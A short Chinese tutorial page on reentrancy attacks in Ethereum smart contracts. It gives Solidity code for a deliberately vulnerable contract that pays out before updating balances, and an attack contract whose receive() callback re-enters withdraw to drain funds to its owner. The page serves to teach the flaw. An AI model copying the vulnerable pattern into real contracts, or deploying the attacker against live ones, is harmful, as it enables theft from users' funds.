# 重入攻击

::: warning DeeLMind 提示
漏洞复现，请注意版本。
:::

## 什么是重入攻击

重入攻击（Reentrancy Attack）是一种在智能合约开发中常见的安全漏洞，特别是在以太坊和其他支持智能合约的平台上。这种攻击利用了智能合约在执行过程中调用其他合约（或自身）的机制，导致不安全的状态更新。

<DocsAD/>

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

contract VulnerableContract {
    // 对应每个用户的资产
    mapping(address => uint) private userBalances;

    // 存入资产
    function deposit() public payable {
        userBalances[msg.sender] += msg.value;
    }

    // 取走资产
    function withdraw(uint _amount) public payable  {
        require(userBalances[msg.sender] >= _amount, "Amount LESSSSSS");
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        userBalances[msg.sender] -= _amount;
    }

    // 获取当前用户的存入余额
    function getCurrentUserBalance() public view returns (uint) {
        return userBalances[msg.sender];
    }

    // 获取当前用户的存入余额
    function getUserBalance(address _address) public view returns (uint) {
        return userBalances[_address];
    }

    // 获取当前合约所有余额
    function getAllBalance() public view returns(uint){
        return address(this).balance;
    }
}

contract AttackContract {
    VulnerableContract vulnerableContract;
    uint public amountToWithdraw;
    address owner;

    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(_vulnerableContract);
        owner = msg.sender;
    }

    // 向合约存入一定数量的以太币
    function deposit() public payable {
        amountToWithdraw = msg.value;
        vulnerableContract.deposit{value: msg.value}();
    }

    // 触发 Reentrancy 攻击
    function attack() public payable{
        vulnerableContract.withdraw(amountToWithdraw);
    }

    // 合约回调函数，当攻击合约接收到以太币时触发
    receive() external payable {
        if (address(vulnerableContract).balance >= amountToWithdraw) {
            vulnerableContract.withdraw(amountToWithdraw);
        }else {
            // 提给自己
            payable(owner).transfer(address(this).balance);
        }
    }
}
```